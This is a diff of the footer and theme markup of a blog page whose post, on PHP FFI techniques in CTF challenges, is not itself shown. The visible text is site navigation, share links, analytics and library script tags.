+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&name=php中不出网的FFI&description=PHP7.4的一个拓展利用"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&t=php中不出网的FFI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
 </div>
 
-		</div>
-		
+        
+        <footer id="footer">
+  <style>
+    .footer-content {
+      line-height: 24px;
+      text-align: center;
+      margin-top: 10px;
+    }
+  </style>
 
-		
-		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-			
-			<li class="tag-item mx-0.5">
-				<a href="/tags/php/">#php</a>&nbsp;
-			</li>
-			
-			<li class="tag-item mx-0.5">
-				<a href="/tags/%E5%A7%BF%E5%8A%BF/">#姿势</a>&nbsp;
-			</li>
-			
-		</ul>
-		
-
-		
-  <div class="recommended-article px-2 sm:px-6 md:px-8">
-   <div class="recommended-desktop">
-    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
-     <i aria-hidden="true"></i><span>推荐阅读</span>
-    </div>
-    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/10/31/2024-11-计划/" title="2024\11_计划" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="2024\11_计划" class="!max-w-none">
-  <span class="title">2024\11_计划</span>
-</a><a class="recommended-article-item" href="/2024/08/18/GYCTF2020/" title="GYCTF2020" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="GYCTF2020" class="!max-w-none">
-  <span class="title">GYCTF2020</span>
-</a><a class="recommended-article-item" href="/2024/08/17/url中的好玩的姿势/" title="url中的好玩的姿势" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="url中的好玩的姿势" class="!max-w-none">
-  <span class="title">url中的好玩的姿势</span>
-</a></div>
-   </div>
-   <div class="recommended-mobile">
-   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
-     <i aria-hidden="true"></i><span>推荐阅读</span>
-   </div>
-   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/10/31/2024-11-计划/" title="2024\11_计划" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="2024\11_计划" class="!max-w-none">
-  <span class="title">2024\11_计划</span>
-</a><a class="recommended-article-item" href="/2024/08/18/GYCTF2020/" title="GYCTF2020" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="GYCTF2020" class="!max-w-none">
-  <span class="title">GYCTF2020</span>
-</a></div>
-   </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    baozongwi
   </div>
 
-		
-		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2024/11/08/github-pages%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E5%8F%8A%E5%8A%A0%E9%80%9F/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">github-pages自定义域名及加速</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
-			
-			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2024/11/07/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">玄机第二章日志分析-redis应急响应</span>
-						<span class="post-nav-item">Next posts</span>
-					</span>
-					<span class="right arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-right"></i>
-					</span>
-				</a>
-			</div>
-			
-		</div>
-		
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
 
+  <!-- 添加友情链接 -->
+  <div class="friend-links footer-content">
+    <a href="https://www.dkdun.cn/login" target="_blank" style="margin-right: 15px;">DKdun</a>
+    <a href="https://ctf.show/" target="_blank">CTFSHOW</a>
+  </div>
 
-		
-		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-			<div class="comments-container mt-10 w-full ">
-    <div id="comment-anchor" class="w-full h-2.5"></div>
-    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        Comments
-    </div>
-    
+  <!-- 添加ICP备案信息 -->
+  <div class="icp-info footer-content">
+    <a href="https://beian.miit.gov.cn/" target="_blank" style="color: #888; text-decoration: none;">蜀ICP备2024111128号</a>
+  </div>
 
-        
-            
-    <div id="waline"></div>
-    <script type="module" data-swup-reload-script>
-      import { init } from '/js/libs/waline.mjs';
-
-      function loadWaline() {
-        init({
-          el: '#waline',
-          serverURL: 'https://comment.baozongwi.xyz',
-          lang: 'zh-CN',
-          dark: 'body[class~="dark-mode"]',
-          reaction: false,
-          requiredMeta: ['nick', 'mail'],
-          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/tw-emoji'],
-          
-          
-        });
-      }
-
-      if (typeof swup !== 'undefined') {
-        loadWaline();
-      } else {
-        window.addEventListener('DOMContentLoaded', loadWaline);
-      }
-    </script>
-
-
-
-        
-    
-</div>
-
-		</div>
-		
-	</div>
-
-	
-	<div class="toc-content-container">
-		<div class="post-toc-wrap">
-	<div class="post-toc">
-		<div class="toc-title">On this page</div>
-		<div class="page-title">php中不出网的FFI</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3"><span class="nav-text">了解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FFI-cdef"><span class="nav-text">FFI::cdef</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FFI-load"><span class="nav-text">FFI::load</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FFI-new"><span class="nav-text">FFI::new</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-text">利用姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCTF-2019-Nextphp"><span class="nav-text">[RCTF 2019]Nextphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCTF-2020-easyphp"><span class="nav-text">TCTF 2020 easyphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#noeasyphp-revenge"><span class="nav-text">noeasyphp(revenge)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-FighterFightsInvincibly"><span class="nav-text">[极客大挑战 2020] FighterFightsInvincibly</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x03 小结</span></a></li></ol>
-
-	</div>
-</div>
-	</div>
-	
-</div>
-			</div>
-
-			
-		</div>
-
-		<div class="main-content-footer">
-			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
-    <div class="info-container py-3 text-center">
-        
-        <div class="text-center">
-            &copy;
-            
-              <span>2024</span>
-              -
-            
-            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">baozongwi</a>
-            
-                
-                <p class="post-count space-x-0.5">
-                    <span>
-                        129 posts in total
-                    </span>
-                    
-                        <span>
-                            310.3k words in total
-                        </span>
-                    
-                </p>
-            
-        </div>
-        
-            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
-            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
-                
-                    <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">VISITOR COUNT</span>
-                        <span id="busuanzi_value_site_uv"></span>
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">TOTAL PAGE VIEWS</span>
-                        <span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
-        </div>
-        
-            <div class="icp-info my-1"><a target="_blank" rel="nofollow" href="
-                
-                https://beian.miit.gov.cn
-                
-                ">蜀ICP备2024111128号</a></div>
-        
-        
-            <div>
-                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
-            </div>
-        
-        
-            <script data-swup-reload-script>
-                try {
-                    function odometer_init() {
-                    const elements = document.querySelectorAll('.odometer');
-                    elements.forEach(el => {
-                        new Odometer({
-                            el,
-                            format: '( ddd).dd',
-                            duration: 200
-                        });
-                    });
-                    }
-                    odometer_init();
-                } catch (error) {}
-            </script>
-        
-        
-        
-    </div>  
+  <!-- 添加站点统计信息 -->
+  <div class="footer-content">
+    <span id="busuanzi_container_site_pv">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次 |
+    </span>
+    <span id="busuanzi_container_site_uv">
+      访客数 <span id="busuanzi_value_site_uv"></span> 人次
+    </span>
+  </div>
 </footer>
-		</div>
-	</div>
 
-	
-	<div class="post-tools">
-		<div class="post-tools-container">
-	<ul class="article-tools-list">
-		<!-- TOC aside toggle -->
-		
-		<li class="right-bottom-tools page-aside-toggle">
-			<i class="fa-regular fa-outdent"></i>
-		</li>
-		
+<!-- 在文件末尾添加不蒜子脚本 -->
+<script async src="//busuanzi.ibruce.org/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-		<!-- go comment -->
-		
-		<li class="go-comment">
-			<i class="fa-regular fa-comments"></i>
-		</li>
-		
-	</ul>
-</div>
-	</div>
-	
-
-	<div class="right-side-tools-container">
-		<div class="side-tools-container">
-	<ul class="hidden-tools-list">
-		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-			<i class="fa-regular fa-magnifying-glass-plus"></i>
-		</li>
-
-		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-			<i class="fa-regular fa-magnifying-glass-minus"></i>
-		</li>
-
-		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-			<i class="fa-regular fa-moon"></i>
-		</li>
-
-		<!-- rss -->
-		
-		<li class="right-bottom-tools rss flex justify-center items-center">
-			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
-				<i class="fa-regular fa-rss"></i>
-			</a>
-		</li>
-		
-
-		
-
-		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-			<i class="fa-regular fa-arrow-down"></i>
-		</li>
-	</ul>
-
-	<ul class="visible-tools-list">
-		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-			<i class="fa-regular fa-cog fa-spin"></i>
-		</li>
-		
-		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-			<i class="arrow-up fas fa-arrow-up"></i>
-			<span class="percent"></span>
-		</li>
-		
-		
-	</ul>
-</div>
-	</div>
-
-	<div class="image-viewer-container">
-	<img src="">
-</div>
-
-	
-	<div class="search-pop-overlay">
-	<div class="popup search-popup">
-		<div class="search-header">
-			<span class="search-input-field-pre">
-				<i class="fa-solid fa-keyboard"></i>
-			</span>
-			<div class="search-input-container">
-				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
-			</div>
-			<span class="popup-btn-close">
-				<i class="fa-solid fa-times"></i>
-			</span>
-		</div>
-		<div id="search-result">
-			<div id="no-result">
-				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
-			</div>
-		</div>
-	</div>
-</div>
-	
-
-</main>
+    </div>
+    <!-- styles -->
 
 
-<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
-<script>
-    const swup = new Swup({
-        plugins: [
-            new SwupScriptsPlugin({
-                optin: true,
-            }),
-            new SwupProgressPlugin(),
-            new SwupScrollPlugin({
-                offset: 80,
-            }),
-            new SwupSlideTheme({
-                mainElement: ".main-content-body",
-            }),
-            new SwupPreloadPlugin(),
-        ],
-        containers: ["#swup"],
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-</script>
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
-	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/localSearch.js" ></script>
+<!-- Disqus Comments -->
 
+<!-- utterances Comments -->
 
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>
-
-
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>
-
-
-
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/runtime.js" ></script>
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/odometer.min.js" ></script>
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/assets/odometer-theme-minimal.css">
-
-
-
-  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
-  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>
-
-
-
-    
-        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"></script>
-    
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/mermaid.js" ></script>
-
-
-
-
-
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/anime.min.js" ></script>
-
-
-
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>
-
-
-<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
-<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>
-
-
-
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/bookmarkNav.js" ></script>
-
-	
 </body>
-
 </html>
